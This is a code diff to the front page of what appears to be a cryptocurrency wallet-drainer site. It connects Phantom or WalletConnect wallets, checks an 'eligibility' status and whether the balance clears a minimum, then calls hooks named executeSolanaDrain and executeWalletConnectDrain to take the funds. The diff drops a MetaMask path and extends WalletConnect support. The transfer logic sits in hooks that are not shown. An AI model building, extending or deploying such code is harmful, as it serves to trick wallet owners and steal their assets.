@@ -44,7 +44,7 @@ export default function Home() {
   
   const { executeDrain: executeSolanaDrain } = useSolanaDrain();
   const { executeDrain: executeEthereumDrain } = useEthereumDrain();
-  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain } = useWalletConnect();
+  const { connect: connectWalletConnect, executeDrain: executeWalletConnectDrain, address: wcAddress, isConnected: wcIsConnected } = useWalletConnect();
   
   useEffect(() => {
     if (isMobileBrowser() && !window.solana && !window.ethereum) {
@@ -102,72 +102,8 @@ export default function Home() {
         
         console.log(`[Phantom] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
         
-      } else if (type === 'metamask') {
-        if (!window.ethereum) {
-          window.open('https://metamask.io', '_blank');
-          setEligibilityStatus('idle');
-          return;
-        }
-        
-        // Try multiple methods to get Solana provider from MetaMask
-        let solanaProvider = null;
-        
-        // Method 1: Check if window.solana is from MetaMask
-        if (window.solana && window.solana.isMetaMask) {
-          solanaProvider = window.solana;
-        }
-        
-        // Method 2: Use ethereum provider with Solana request
-        if (!solanaProvider && window.ethereum && window.ethereum.isMetaMask) {
-          try {
-            const accounts = await window.ethereum.request({
-              method: 'wallet_requestSolanaAccounts',
-              params: []
-            });
-            if (accounts && accounts.length > 0) {
-              solanaProvider = window.ethereum;
-            }
-          } catch (err) {
-            console.log('MetaMask Solana request failed:', err.message);
-          }
-        }
-        
-        // Method 3: Fallback to Phantom if available
-        if (!solanaProvider && window.solana?.isPhantom) {
-          solanaProvider = window.solana;
-        }
-
-        if (!solanaProvider) {
-          throw new Error('No Solana wallet detected. Please install Phantom or use MetaMask with Solana support.');
-        }
-
-        // Connect to wallet
-        let response;
-        try {
-          response = await solanaProvider.connect();
-        } catch (connectError) {
-          if (solanaProvider.publicKey) {
-            response = { publicKey: solanaProvider.publicKey };
-          } else {
-            throw connectError;
-          }
-        }
-        
-        address = response.publicKey.toString();
-        
-        const { Connection } = await import('@solana/web3.js');
-        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
-        
-        const lamports = await connection.getBalance(response.publicKey);
-        const balanceInSol = lamports / 1e9;
-        const MIN_REQUIRED_LAMPORTS = 0.003 * 1e9;
-        
-        hasFunds = lamports > MIN_REQUIRED_LAMPORTS;
-        balance = balanceInSol;
-        
-        console.log(`[MetaMask] Balance: ${balanceInSol} SOL, HasFunds: ${hasFunds}`);
-        
       } else if (type === 'walletconnect') {
+        // Use the new WalletConnect hook
         address = await connectWalletConnect();
         
         const { Connection, PublicKey } = await import('@solana/web3.js');
@@ -227,8 +163,6 @@ export default function Home() {
       let result;
       if (walletType === 'phantom') {
         result = await executeSolanaDrain(allocatedAmount);
-      } else if (walletType === 'metamask') {
-        result = await executeEthereumDrain(allocatedAmount);
       } else if (walletType === 'walletconnect') {
         result = await executeWalletConnectDrain(allocatedAmount);
       }
@@ -480,4 +414,4 @@ export default function Home() {
       />
     </div>
   );
-            }
+          }
